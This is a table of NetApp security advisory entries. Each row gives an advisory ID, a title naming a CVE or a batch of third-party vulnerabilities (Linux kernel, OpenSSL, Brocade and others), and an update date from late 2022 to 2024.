| [**NTAP-20230216-0002**](https://security.netapp.com/advisory/ntap-20230216-0002/) | December 2015 PCRE Vulnerabilities in NetApp Products | 2023-05-01 |
| [**NTAP-20230216-0008**](https://security.netapp.com/advisory/ntap-20230216-0008/) | December 2022 Heimdal Vulnerabilities in NetApp Products | 2024-01-24 |
| [**NTAP-20230216-0004**](https://security.netapp.com/advisory/ntap-20230216-0004/) | December 2022 Squid Vulnerabilities in NetApp Products | 2023-02-16 |
| [**NTAP-20230216-0007**](https://security.netapp.com/advisory/ntap-20230216-0007/) | January 2023 Apache HTTP Server Vulnerabilities in NetApp Products | 2023-03-14 |
| [**NTAP-20230214-0003**](https://security.netapp.com/advisory/ntap-20230214-0003/) | August 2022 Linux Kernel 5.17 Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20230214-0005**](https://security.netapp.com/advisory/ntap-20230214-0005/) | August 2022 Linux Kernel 5.18 Vulnerabilities in NetApp Products | 2023-03-14 |
| [**NTAP-20230214-0004**](https://security.netapp.com/advisory/ntap-20230214-0004/) | August 2022 Linux Kernel 5.19 Vulnerabilities in NetApp Products | 2023-03-14 |
| [**NTAP-20230214-0010**](https://security.netapp.com/advisory/ntap-20230214-0010/) | CVE-2021-35065 Node.js Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230214-0009**](https://security.netapp.com/advisory/ntap-20230214-0009/) | CVE-2022-3649 Linux Kernel Vulnerability in NetApp Products | 2023-03-08 |
| [**NTAP-20230214-0007**](https://security.netapp.com/advisory/ntap-20230214-0007/) | CVE-2022-39189 Linux Kernel Vulnerability in NetApp Products | 2023-03-13 |
| [**NTAP-20230214-0001**](https://security.netapp.com/advisory/ntap-20230214-0001/) | CVE-2022-40897 Python Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230214-0008**](https://security.netapp.com/advisory/ntap-20230214-0008/) | CVE-2022-41222 Linux Kernel Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230214-0002**](https://security.netapp.com/advisory/ntap-20230214-0002/) | December 2022 cURL/libcURL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20230214-0011**](https://security.netapp.com/advisory/ntap-20230214-0011/) | February 2023 OpenSSL Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20230214-0006**](https://security.netapp.com/advisory/ntap-20230214-0006/) | September 2022 Linux Kernel 5.17 Vulnerabilities in NetApp Products | 2023-03-14 |
| [**NTAP-20230208-0001**](https://security.netapp.com/advisory/ntap-20230208-0001/) | January 2023 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-04-05 |
| [**NTAP-20230208-0002**](https://security.netapp.com/advisory/ntap-20230208-0002/) | January 2023 MySQL Server Vulnerabilities in NetApp Products | 2024-07-19 |
| [**NTAP-20230203-0009**](https://security.netapp.com/advisory/ntap-20230203-0009/) | CVE-2022-2327 Linux Kernel Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230203-0004**](https://security.netapp.com/advisory/ntap-20230203-0004/) | CVE-2022-2601 Grub2 Vulnerability in NetApp Products | 2023-11-22 |
| [**NTAP-20230203-0006**](https://security.netapp.com/advisory/ntap-20230203-0006/) | CVE-2022-32149 Golang Text Vulnerability in NetApp Products | 2023-02-10 |
| [**NTAP-20230203-0002**](https://security.netapp.com/advisory/ntap-20230203-0002/) | CVE-2022-3570 LibTIFF Vulnerability in NetApp Products | 2023-02-03 |
| [**NTAP-20230203-0001**](https://security.netapp.com/advisory/ntap-20230203-0001/) | CVE-2022-37454 Keccak XKCP Vulnerability in NetApp Products | 2023-03-28 |
| [**NTAP-20230203-0003**](https://security.netapp.com/advisory/ntap-20230203-0003/) | CVE-2022-3996 OpenSSL Vulnerability in NetApp Products | 2024-11-14 |
| [**NTAP-20230203-0007**](https://security.netapp.com/advisory/ntap-20230203-0007/) | CVE-2022-4293 Vim Vulnerability in NetApp Products | 2023-02-03 |
| [**NTAP-20230203-0005**](https://security.netapp.com/advisory/ntap-20230203-0005/) | CVE-2022-46908 SQLite Vulnerability in NetApp Products | 2023-08-22 |
| [**NTAP-20230203-0008**](https://security.netapp.com/advisory/ntap-20230203-0008/) | October 2022 Linux Kernel 5.19.15 Vulnerabilities in NetApp Products | 2023-02-08 |
| [**NTAP-20230127-0014**](https://security.netapp.com/advisory/ntap-20230127-0014/) | April 2022 OWASP Enterprise Security API Vulnerabilities in NetApp Products | 2024-10-22 |
| [**NTAP-20230127-0001**](https://security.netapp.com/advisory/ntap-20230127-0001/) | CVE-2022-28169 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0002**](https://security.netapp.com/advisory/ntap-20230127-0002/) | CVE-2022-28170 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0003**](https://security.netapp.com/advisory/ntap-20230127-0003/) | CVE-2022-33178 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0004**](https://security.netapp.com/advisory/ntap-20230127-0004/) | CVE-2022-33179 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0005**](https://security.netapp.com/advisory/ntap-20230127-0005/) | CVE-2022-33180 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0006**](https://security.netapp.com/advisory/ntap-20230127-0006/) | CVE-2022-33181 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0007**](https://security.netapp.com/advisory/ntap-20230127-0007/) | CVE-2022-33182 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0008**](https://security.netapp.com/advisory/ntap-20230127-0008/) | CVE-2022-33183 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0009**](https://security.netapp.com/advisory/ntap-20230127-0009/) | CVE-2022-33184 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0010**](https://security.netapp.com/advisory/ntap-20230127-0010/) | CVE-2022-33185 Brocade Fabric OS Vulnerability | 2023-01-27 |
| [**NTAP-20230127-0012**](https://security.netapp.com/advisory/ntap-20230127-0012/) | CVE-2022-4144 QEMU Vulnerability in NetApp Products | 2023-01-27 |
| [**NTAP-20230127-0013**](https://security.netapp.com/advisory/ntap-20230127-0013/) | CVE-2022-4172 QEMU Vulnerability in NetApp Products | 2023-01-27 |
| [**NTAP-20230127-0015**](https://security.netapp.com/advisory/ntap-20230127-0015/) | CVE-2023-22809 Sudo Vulnerability in NetApp Products | 2023-10-17 |
| [**NTAP-20230127-0011**](https://security.netapp.com/advisory/ntap-20230127-0011/) | December 2022 X.Org X Server Vulnerabilities in NetApp Products | 2023-01-27 |
| [**NTAP-20230120-0003**](https://security.netapp.com/advisory/ntap-20230120-0003/) | CVE-2022-41296 IBM Db2 Vulnerability in NetApp Products | 2023-01-20 |
| [**NTAP-20230120-0007**](https://security.netapp.com/advisory/ntap-20230120-0007/) | CVE-2022-41716 Golang Vulnerability in NetApp Products | 2023-05-05 |
| [**NTAP-20230120-0008**](https://security.netapp.com/advisory/ntap-20230120-0008/) | CVE-2022-41717 Golang Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20230120-0004**](https://security.netapp.com/advisory/ntap-20230120-0004/) | CVE-2022-43548 Node.js Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20230120-0002**](https://security.netapp.com/advisory/ntap-20230120-0002/) | December 2022 Apache CXF Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20230120-0009**](https://security.netapp.com/advisory/ntap-20230120-0009/) | December 2022 JsonWebToken Vulnerabilities in NetApp Products | 2023-04-20 |
| [**NTAP-20230120-0001**](https://security.netapp.com/advisory/ntap-20230120-0001/) | Linux Kernel 5.18 Vulnerabilities in NetApp Products | 2023-02-16 |
| [**NTAP-20230120-0006**](https://security.netapp.com/advisory/ntap-20230120-0006/) | October 2022 Golang Vulnerabilities in NetApp Products | 2023-05-05 |
| [**NTAP-20230120-0005**](https://security.netapp.com/advisory/ntap-20230120-0005/) | October 2022 NGINX Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20230113-0001**](https://security.netapp.com/advisory/ntap-20230113-0001/) | CVE-2022-2964 Linux Kernel Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20230113-0002**](https://security.netapp.com/advisory/ntap-20230113-0002/) | CVE-2022-35255 Node.js Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20230113-0005**](https://security.netapp.com/advisory/ntap-20230113-0005/) | CVE-2022-4292 Vim Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230113-0004**](https://security.netapp.com/advisory/ntap-20230113-0004/) | December 2022 Apache Netty Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20230113-0003**](https://security.netapp.com/advisory/ntap-20230113-0003/) | December 2022 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2024-03-11 |
| [**NTAP-20230113-0007**](https://security.netapp.com/advisory/ntap-20230113-0007/) | December 2022 Linux Kernel 6.0.11 Vulnerabilities in NetApp Products | 2023-02-16 |
| [**NTAP-20230113-0008**](https://security.netapp.com/advisory/ntap-20230113-0008/) | November 2022 Linux Kernel 6.0.10 Vulnerabilities in NetApp Products | 2023-02-16 |
| [**NTAP-20230113-0006**](https://security.netapp.com/advisory/ntap-20230113-0006/) | November 2022 Linux Kernel 6.0.9 Vulnerabilities in NetApp Products | 2023-02-16 |
| [**NTAP-20230110-0002**](https://security.netapp.com/advisory/ntap-20230110-0002/) | CVE-2021-22600 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20230110-0006**](https://security.netapp.com/advisory/ntap-20230110-0006/) | December 2022 cURL/libcURL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20230110-0003**](https://security.netapp.com/advisory/ntap-20230110-0003/) | December 2022 Samba Vulnerabilities in NetApp Products | 2023-04-04 |
| [**NTAP-20230110-0005**](https://security.netapp.com/advisory/ntap-20230110-0005/) | Linux Kernel prior to 5.19.2 Vulnerabilities in NetApp Products | 2023-04-07 |
| [**NTAP-20230110-0004**](https://security.netapp.com/advisory/ntap-20230110-0004/) | Linux Kernel through 5.19.1 Vulnerabilities in NetApp Products | 2023-04-07 |
| [**NTAP-20230110-0001**](https://security.netapp.com/advisory/ntap-20230110-0001/) | October 2022 LibTIFF Vulnerabilities in NetApp Products | 2023-02-07 |
| [**NTAP-20221228-0008**](https://security.netapp.com/advisory/ntap-20221228-0008/) | April 2022 LibTIFF Vulnerabilities in NetApp Products | 2023-02-07 |
| [**NTAP-20221228-0005**](https://security.netapp.com/advisory/ntap-20221228-0005/) | CVE-2016-2338 Ruby Vulnerability in NetApp Products | 2022-12-28 |
| [**NTAP-20221228-0004**](https://security.netapp.com/advisory/ntap-20221228-0004/) | CVE-2021-33621 Ruby Vulnerability in NetApp Products | 2022-12-28 |
| [**NTAP-20221228-0002**](https://security.netapp.com/advisory/ntap-20221228-0002/) | CVE-2021-4028 Linux Kernel Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20221228-0003**](https://security.netapp.com/advisory/ntap-20221228-0003/) | CVE-2021-4204 Linux Kernel Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20221228-0006**](https://security.netapp.com/advisory/ntap-20221228-0006/) | CVE-2022-1199 Linux Kernel Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221228-0007**](https://security.netapp.com/advisory/ntap-20221228-0007/) | CVE-2022-3202 Linux Kernel Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20221228-0001**](https://security.netapp.com/advisory/ntap-20221228-0001/) | CVE-2022-3541 Linux Kernel Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20221228-0010**](https://security.netapp.com/advisory/ntap-20221228-0010/) | CVE-2022-38177 ISC BIND Vulnerability in NetApp Products | 2023-11-22 |
| [**NTAP-20221228-0009**](https://security.netapp.com/advisory/ntap-20221228-0009/) | CVE-2022-38178 ISC BIND Vulnerability in NetApp Products | 2023-11-22 |
| [**NTAP-20221223-0009**](https://security.netapp.com/advisory/ntap-20221223-0009/) | CVE-2021-31693 VMware Tools Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20221223-0007**](https://security.netapp.com/advisory/ntap-20221223-0007/) | CVE-2021-46784 Squid Vulnerability in NetApp Products | 2023-01-06 |
| [**NTAP-20221223-0002**](https://security.netapp.com/advisory/ntap-20221223-0002/) | CVE-2022-2938 Linux Kernel Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20221223-0008**](https://security.netapp.com/advisory/ntap-20221223-0008/) | CVE-2022-31630 PHP Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20221223-0006**](https://security.netapp.com/advisory/ntap-20221223-0006/) | CVE-2022-3165 QEMU Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20221223-0003**](https://security.netapp.com/advisory/ntap-20221223-0003/) | CVE-2022-3545 Linux Kernel Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20221223-0001**](https://security.netapp.com/advisory/ntap-20221223-0001/) | CVE-2022-3564 Linux Kernel Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20221223-0004**](https://security.netapp.com/advisory/ntap-20221223-0004/) | CVE-2022-3705 Vim Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20221223-0010**](https://security.netapp.com/advisory/ntap-20221223-0010/) | CVE-2022-3920 HashiCorp Consul Vulnerability Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20221223-0005**](https://security.netapp.com/advisory/ntap-20221223-0005/) | CVE-2022-42252 Apache Tomcat Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20221220-0001**](https://security.netapp.com/advisory/ntap-20221220-0001/) | CVE-2022-38733 Authentication Bypass Vulnerability in OnCommand Insight | 2022-12-20 |
| [**NTAP-20221215-0008**](https://security.netapp.com/advisory/ntap-20221215-0008/) | CVE-2014-0144 QEMU Vulnerability in NetApp Products | 2022-12-15 |
| [**NTAP-20221215-0002**](https://security.netapp.com/advisory/ntap-20221215-0002/) | CVE-2021-3671 Samba Vulnerability in NetApp Products | 2022-12-15 |
| [**NTAP-20221215-0005**](https://security.netapp.com/advisory/ntap-20221215-0005/) | CVE-2022-3872 QEMU Vulnerability in NetApp Products | 2022-12-15 |
| [**NTAP-20221215-0003**](https://security.netapp.com/advisory/ntap-20221215-0003/) | CVE-2022-39328 Grafana Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20221215-0009**](https://security.netapp.com/advisory/ntap-20221215-0009/) | CVE-2022-3970 LibTIFF Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20221215-0006**](https://security.netapp.com/advisory/ntap-20221215-0006/) | CVE-2022-43945 Linux Kernel Vulnerability in NetApp Products | 2023-01-23 |
| [**NTAP-20221215-0007**](https://security.netapp.com/advisory/ntap-20221215-0007/) | December 2022 MegaRAC BMC Firmware Vulnerabilities in NetApp Products | 2022-12-30 |
| [**NTAP-20221215-0004**](https://security.netapp.com/advisory/ntap-20221215-0004/) | November 2022 Grafana Vulnerabilities in NetApp Products | 2023-03-07 |
| [**NTAP-20221215-0010**](https://security.netapp.com/advisory/ntap-20221215-0010/) | October 2022 Spring Security Vulnerabilities in NetApp Products | 2024-05-15 |
| [**NTAP-20221215-0001**](https://security.netapp.com/advisory/ntap-20221215-0001/) | September 2022 Grafana Vulnerabilities in NetApp Products | 2022-12-15 |
| [**NTAP-20221209-0002**](https://security.netapp.com/advisory/ntap-20221209-0002/) | August 2022 Util-linux Vulnerabilities in NetApp Products | 2022-12-09 |
| [**NTAP-20221209-0008**](https://security.netapp.com/advisory/ntap-20221209-0008/) | CVE-2012-4244 ISC BIND Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20221209-0009**](https://security.netapp.com/advisory/ntap-20221209-0009/) | CVE-2022-23093 FreeBSD Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221209-0004**](https://security.netapp.com/advisory/ntap-20221209-0004/) | CVE-2022-31176 Grafana Vulnerability in NetApp Products | 2022-12-09 |
| [**NTAP-20221209-0005**](https://security.netapp.com/advisory/ntap-20221209-0005/) | CVE-2022-35278 Apache ActiveMQ Artemis Vulnerability in NetApp Products | 2022-12-09 |
| [**NTAP-20221209-0006**](https://security.netapp.com/advisory/ntap-20221209-0006/) | CVE-2022-42919 Python Vulnerability in NetApp Products | 2023-01-17 |
| [**NTAP-20221209-0007**](https://security.netapp.com/advisory/ntap-20221209-0007/) | CVE-2022-45061 Python Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20221209-0003**](https://security.netapp.com/advisory/ntap-20221209-0003/) | November 2022 Libxml2 Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20221209-0010**](https://security.netapp.com/advisory/ntap-20221209-0010/) | October 2022 cURL/libcURL Vulnerabilities in NetApp Products | 2023-05-10 |
| [**NTAP-20221209-0001**](https://security.netapp.com/advisory/ntap-20221209-0001/) | September 2022 PHP Vulnerabilities in NetApp Products | 2022-12-21 |
| [**NTAP-20221201-0003**](https://security.netapp.com/advisory/ntap-20221201-0003/) | CVE-2021-25642 Apache Hadoop Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20221201-0004**](https://security.netapp.com/advisory/ntap-20221201-0004/) | CVE-2021-3859 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20221201-0002**](https://security.netapp.com/advisory/ntap-20221201-0002/) | CVE-2021-3975 Libvirt Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20221201-0001**](https://security.netapp.com/advisory/ntap-20221201-0001/) | CVE-2022-41316 HashiCorp Vault Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20221128-0002**](https://security.netapp.com/advisory/ntap-20221128-0002/) | CVE-2022-33187 Brocade SANnav Vulnerability | 2022-11-28 |
| [**NTAP-20221128-0001**](https://security.netapp.com/advisory/ntap-20221128-0001/) | CVE-2022-42898 Samba Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20221128-0003**](https://security.netapp.com/advisory/ntap-20221128-0003/) | CVE-2022-43933 Brocade SANnav Vulnerability | 2022-11-28 |
| [**NTAP-20221128-0004**](https://security.netapp.com/advisory/ntap-20221128-0004/) | CVE-2022-43934 Brocade SANnav Vulnerability | 2022-11-28 |
| [**NTAP-20221128-0005**](https://security.netapp.com/advisory/ntap-20221128-0005/) | CVE-2022-43935 Brocade SANnav Vulnerability | 2022-11-28 |
| [**NTAP-20221128-0006**](https://security.netapp.com/advisory/ntap-20221128-0006/) | CVE-2022-43936 Brocade SANnav Vulnerability | 2022-11-28 |
| [**NTAP-20221124-0003**](https://security.netapp.com/advisory/ntap-20221124-0003/) | CVE-2021-3770 Vim Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221124-0002**](https://security.netapp.com/advisory/ntap-20221124-0002/) | CVE-2022-31123 Grafana Vulnerability in NetApp Products | 2023-03-07 |
| [**NTAP-20221124-0001**](https://security.netapp.com/advisory/ntap-20221124-0001/) | CVE-2022-41323 Django Vulnerability in NetApp Products | 2022-11-24 |
| [**NTAP-20221124-0004**](https://security.netapp.com/advisory/ntap-20221124-0004/) | CVE-2022-42003 FasterXML Jackson Databind Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20221118-0003**](https://security.netapp.com/advisory/ntap-20221118-0003/) | CVE-2021-3778 Vim Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221118-0004**](https://security.netapp.com/advisory/ntap-20221118-0004/) | CVE-2021-3796 Vim Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20221118-0006**](https://security.netapp.com/advisory/ntap-20221118-0006/) | CVE-2021-46848 GNU Libtasn1 Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20221118-0001**](https://security.netapp.com/advisory/ntap-20221118-0001/) | CVE-2022-21831 Ruby Vulnerability in NetApp Products | 2022-11-18 |
| [**NTAP-20221118-0002**](https://security.netapp.com/advisory/ntap-20221118-0002/) | CVE-2022-22577 Ruby Vulnerability in NetApp Products | 2022-11-18 |
| [**NTAP-20221118-0005**](https://security.netapp.com/advisory/ntap-20221118-0005/) | CVE-2022-40664 Apache Shiro Vulnerability in NetApp Products | 2024-02-29 |
| [**NTAP-20221118-0008**](https://security.netapp.com/advisory/ntap-20221118-0008/) | CVE-2022-42004 FasterXML Jackson Databind Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20221118-0007**](https://security.netapp.com/advisory/ntap-20221118-0007/) | CVE-2022-43680 libexpat Vulnerability in NetApp Products | 2023-03-07 |
| [**NTAP-20221111-0004**](https://security.netapp.com/advisory/ntap-20221111-0004/) | CVE-2019-20446 GNOME Librsvg Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221111-0007**](https://security.netapp.com/advisory/ntap-20221111-0007/) | CVE-2020-35527 SQLite Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221111-0003**](https://security.netapp.com/advisory/ntap-20221111-0003/) | CVE-2021-4203 Linux Kernel Vulnerability in NetApp Products | 2024-05-08 |
| [**NTAP-20221111-0001**](https://security.netapp.com/advisory/ntap-20221111-0001/) | CVE-2021-43618 GMP Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20221111-0002**](https://security.netapp.com/advisory/ntap-20221111-0002/) | CVE-2022-24903 Rsyslog Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221111-0005**](https://security.netapp.com/advisory/ntap-20221111-0005/) | CVE-2022-2526 Systemd Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221111-0009**](https://security.netapp.com/advisory/ntap-20221111-0009/) | CVE-2022-28131 Golang Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20221111-0008**](https://security.netapp.com/advisory/ntap-20221111-0008/) | CVE-2022-40186 HashiCorp Vault Vulnerability in NetApp Products | 2022-11-11 |
| [**NTAP-20221111-0006**](https://security.netapp.com/advisory/ntap-20221111-0006/) | Intel SA-00688 BIOS Firmware Vulnerabilities in NetApp Products | 2022-11-11 |
| [**NTAP-20221110-0001**](https://security.netapp.com/advisory/ntap-20221110-0001/) | CVE-2022-33186 Brocade Fabric Operating System Firmware Vulnerability | 2022-11-10 |
| [**NTAP-20221104-0001**](https://security.netapp.com/advisory/ntap-20221104-0001/) | CVE-2021-3999 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-11-14 |
| [**NTAP-20221104-0004**](https://security.netapp.com/advisory/ntap-20221104-0004/) | CVE-2021-4189 Python Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20221104-0005**](https://security.netapp.com/advisory/ntap-20221104-0005/) | CVE-2022-1552 PostgreSQL Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20221104-0006**](https://security.netapp.com/advisory/ntap-20221104-0006/) | CVE-2022-36033 jsoup Vulnerability in NetApp Products | 2022-11-04 |
| [**NTAP-20221104-0007**](https://security.netapp.com/advisory/ntap-20221104-0007/) | CVE-2022-38533 GNU Binutils Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20221104-0008**](https://security.netapp.com/advisory/ntap-20221104-0008/) | CVE-2022-38791 MariaDB Vulnerability in NetApp Products | 2022-11-04 |
| [**NTAP-20221104-0002**](https://security.netapp.com/advisory/ntap-20221104-0002/) | CVE-2022-39046 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20221104-0003**](https://security.netapp.com/advisory/ntap-20221104-0003/) | September 2022 X.Org X Server Vulnerabilities in NetApp Products | 2022-11-04 |
| [**NTAP-20221102-0001**](https://security.netapp.com/advisory/ntap-20221102-0001/) | November 2022 OpenSSL Vulnerabilities in NetApp Products | 2024-10-14 |
| [**NTAP-20221028-0001**](https://security.netapp.com/advisory/ntap-20221028-0001/) | CVE-2018-14550 libpng Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221028-0002**](https://security.netapp.com/advisory/ntap-20221028-0002/) | CVE-2019-13990 Quartz Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221028-0010**](https://security.netapp.com/advisory/ntap-20221028-0010/) | CVE-2020-14155 PCRE Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221028-0003**](https://security.netapp.com/advisory/ntap-20221028-0003/) | CVE-2021-3753 Linux Kernel Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221028-0004**](https://security.netapp.com/advisory/ntap-20221028-0004/) | CVE-2021-3800 GNOME GLib Vulnerability in NetApp Products | 2023-03-08 |
| [**NTAP-20221028-0005**](https://security.netapp.com/advisory/ntap-20221028-0005/) | CVE-2022-23437 Apache XercesJ Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221028-0007**](https://security.netapp.com/advisory/ntap-20221028-0007/) | CVE-2022-25258 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20221028-0006**](https://security.netapp.com/advisory/ntap-20221028-0006/) | CVE-2022-26336 Apache POI Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20221028-0014**](https://security.netapp.com/advisory/ntap-20221028-0014/) | CVE-2022-3358 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20221028-0015**](https://security.netapp.com/advisory/ntap-20221028-0015/) | CVE-2022-33980 Apache Commons Configuration Vulnerability in NetApp Products | 2022-10-28 |
| [**NTAP-20221028-0016**](https://security.netapp.com/advisory/ntap-20221028-0016/) | CVE-2022-34339 IBM Cognos Analytics Vulnerability in NetApp Products | 2022-10-28 |
| [**NTAP-20221028-0008**](https://security.netapp.com/advisory/ntap-20221028-0008/) | CVE-2022-40674 libexpat Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221028-0009**](https://security.netapp.com/advisory/ntap-20221028-0009/) | June 2022 PCRE Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20221028-0012**](https://security.netapp.com/advisory/ntap-20221028-0012/) | October 2022 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20221028-0013**](https://security.netapp.com/advisory/ntap-20221028-0013/) | October 2022 MySQL Server Vulnerabilities in NetApp Products | 2024-03-11 |
| [**NTAP-20221028-0011**](https://security.netapp.com/advisory/ntap-20221028-0011/) | October 2022 Samba Vulnerabilities in NetApp Products | 2023-09-15 |
| [**NTAP-20221020-0003**](https://security.netapp.com/advisory/ntap-20221020-0003/) | CVE-2021-3998 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221020-0001**](https://security.netapp.com/advisory/ntap-20221020-0001/) | CVE-2021-4214 Libpng Vulnerability in NetApp Products | 2023-11-02 |
| [**NTAP-20221020-0006**](https://security.netapp.com/advisory/ntap-20221020-0006/) | CVE-2022-1012 Linux Kernel Vulnerability in NetApp Products | 2023-05-05 |
| [**NTAP-20221020-0005**](https://security.netapp.com/advisory/ntap-20221020-0005/) | CVE-2022-35951 Redis Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20221020-0004**](https://security.netapp.com/advisory/ntap-20221020-0004/) | CVE-2022-42889 Apache Commons Text Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20221020-0002**](https://security.netapp.com/advisory/ntap-20221020-0002/) | September 2022 BlueZ Vulnerabilities in NetApp Products | 2022-10-20 |
| [**NTAP-20221017-0001**](https://security.netapp.com/advisory/ntap-20221017-0001/) | CVE-2022-23241 Arbitrary WORM Data Modification Vulnerability in ONTAP 9.11.1 | 2022-10-17 |
| [**NTAP-20221017-0003**](https://security.netapp.com/advisory/ntap-20221017-0003/) | CVE-2022-31676 VMware Tools Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20221017-0002**](https://security.netapp.com/advisory/ntap-20221017-0002/) | CVE-2022-36067 NPM Vulnerability in NetApp Products | 2022-10-17 |
| [**NTAP-20221014-0005**](https://security.netapp.com/advisory/ntap-20221014-0005/) | August 2022 IBM Cognos Analytics Vulnerabilities | 2022-10-28 |
| [**NTAP-20221014-0007**](https://security.netapp.com/advisory/ntap-20221014-0007/) | August 2022 LibTIFF Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20221014-0006**](https://security.netapp.com/advisory/ntap-20221014-0006/) | August 2022 Undertow Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20221014-0002**](https://security.netapp.com/advisory/ntap-20221014-0002/) | CVE-2021-3807 Node.js Vulnerability in NetApp Products | 2022-12-01 |
| [**NTAP-20221014-0001**](https://security.netapp.com/advisory/ntap-20221014-0001/) | CVE-2021-43466 Thymeleaf Vulnerability in NetApp Products | 2022-10-14 |
| [**NTAP-20221014-0008**](https://security.netapp.com/advisory/ntap-20221014-0008/) | CVE-2022-2953 LibTIFF Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20221014-0003**](https://security.netapp.com/advisory/ntap-20221014-0003/) | CVE-2022-31129 Node.js Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20221014-0004**](https://security.netapp.com/advisory/ntap-20221014-0004/) | Intel SA-00709 AMT Vulnerabilities in NetApp Products | 2022-11-10 |
| [**NTAP-20221007-0001**](https://security.netapp.com/advisory/ntap-20221007-0001/) | CVE-2021-3772 Linux Kernel Vulnerability in NetApp Products | 2022-10-07 |
| [**NTAP-20221007-0004**](https://security.netapp.com/advisory/ntap-20221007-0004/) | CVE-2021-46828 libtirpc Vulnerability in NetApp Products | 2022-10-07 |
| [**NTAP-20221007-0008**](https://security.netapp.com/advisory/ntap-20221007-0008/) | CVE-2022-0358 QEMU Vulnerability in NetApp Products | 2022-10-07 |
